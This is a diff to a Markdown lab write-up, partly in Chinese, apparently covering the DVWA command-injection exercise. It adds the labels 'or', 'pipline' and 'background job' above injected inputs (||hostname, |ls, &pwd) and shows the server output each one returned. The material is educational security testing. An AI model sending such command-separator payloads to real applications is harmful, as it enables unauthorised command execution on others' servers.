@@ -64,18 +64,20 @@ round-trip min/avg/max/stddev = 9.902/10.393/10.778/0.390 ms
 
 多試幾次後，運氣好猜中， `||` , `|`, `&`
 
+or
 ```bash
 ||hostname
 # 91ab8a5e75e3
 ```
 
-
+pipline
 ```bash
 |ls
 #help
 #index.php
 #source
 ```
+background job
 ```bash
 &pwd 
 #/var/www/html/vulnerabilities/exec
